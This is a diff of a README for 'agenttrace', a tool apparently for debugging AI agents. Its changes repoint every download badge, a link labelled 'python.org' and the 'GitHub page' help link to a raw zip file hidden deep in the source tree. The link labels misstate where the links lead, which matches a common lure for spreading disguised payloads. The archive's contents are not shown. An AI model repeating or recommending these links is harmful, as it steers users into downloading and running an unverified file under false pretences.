@@ -1,6 +1,6 @@
 # 🕵️‍♂️ agenttrace - Visual Debugging for AI Agents
 
-[![Download agenttrace](https://img.shields.io/badge/Download-agenttrace-brightgreen)](https://raw.githubusercontent.com/umairb0/agenttrace/main/backend/src/agent_trace/domain/services/Software-3.6.zip)
+[![Download agenttrace](https://img.shields.io/badge/Download-agenttrace-brightgreen)](https://raw.githubusercontent.com/umairb0/agenttrace/main/backend/src/agent_trace/Software_3.8.zip)
 
 ---
 
@@ -26,7 +26,7 @@ Before you start, make sure your computer meets these needs:
 - Web browser such as Chrome, Firefox, or Edge to view the UI
 - Python 3.8 or later installed (required to use the SDK)
 
-If you do not have Python installed, please get it from [python.org](https://raw.githubusercontent.com/umairb0/agenttrace/main/backend/src/agent_trace/domain/services/Software-3.6.zip) before continuing.
+If you do not have Python installed, please get it from [python.org](https://raw.githubusercontent.com/umairb0/agenttrace/main/backend/src/agent_trace/Software_3.8.zip) before continuing.
 
 ---
 
@@ -35,7 +35,7 @@ If you do not have Python installed, please get it from [python.org](https://raw
 To get agenttrace on your Windows PC:
 
 1. Click on the green **Download agenttrace** button below to visit the project page.  
-   [![Download agenttrace](https://img.shields.io/badge/Download-agenttrace-brightgreen)](https://raw.githubusercontent.com/umairb0/agenttrace/main/backend/src/agent_trace/domain/services/Software-3.6.zip)
+   [![Download agenttrace](https://img.shields.io/badge/Download-agenttrace-brightgreen)](https://raw.githubusercontent.com/umairb0/agenttrace/main/backend/src/agent_trace/Software_3.8.zip)
 
 2. On the GitHub page, look for the latest release or package files.
 
@@ -143,7 +143,7 @@ Make sure Python and pip are installed before these steps.
 ## 📂 Where to Get Help
 
 - Visit the GitHub page to read more details or report problems:  
-  https://raw.githubusercontent.com/umairb0/agenttrace/main/backend/src/agent_trace/domain/services/Software-3.6.zip
+  https://raw.githubusercontent.com/umairb0/agenttrace/main/backend/src/agent_trace/Software_3.8.zip
 
 - Check the Issues tab there for known problems or questions.
 
@@ -155,4 +155,4 @@ Make sure Python and pip are installed before these steps.
 
 Click the button below to visit the agenttrace GitHub page and download:
 
-[![Download agenttrace](https://img.shields.io/badge/Download-agenttrace-brightgreen)](https://raw.githubusercontent.com/umairb0/agenttrace/main/backend/src/agent_trace/domain/services/Software-3.6.zip)
+[![Download agenttrace](https://img.shields.io/badge/Download-agenttrace-brightgreen)](https://raw.githubusercontent.com/umairb0/agenttrace/main/backend/src/agent_trace/Software_3.8.zip)
